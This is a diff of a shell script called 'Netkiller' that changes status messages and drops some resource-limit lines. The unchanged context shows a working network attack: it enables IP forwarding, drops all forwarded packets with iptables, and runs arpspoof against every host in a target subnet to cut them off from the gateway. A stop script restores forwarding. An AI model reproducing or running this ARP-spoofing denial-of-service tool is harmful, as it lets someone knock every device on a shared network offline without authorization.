@@ -28,16 +28,13 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
 iptables -P FORWARD DROP
 iptables -A FORWARD -j DROP
-ulimit -u 8192
-ulimit -n 65535
-sysctl -w net.ipv4.neigh.default.gc_thresh3=8192 >/dev/null
 
 # Create stop script
 cat > /bin/netkiller-stop << 'EOF'
 #!/bin/sh
 
 echo " "
-echo "Stopping Netkiller!"
+echo "Netkiller is stop...!!!"
 echo " "
 iptables -P FORWARD ACCEPT
 iptables -F FORWARD 
@@ -139,7 +136,7 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
         ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
    done
 fi
-echo "Netkiller kill all the possible hosts in $TARGET_SUBNET"
+echo "Netkiller killing all the hosts in $TARGET_SUBNET"
 echo " "
 echo "To stop, Type: sudo netkiller-stop"
 echo " "
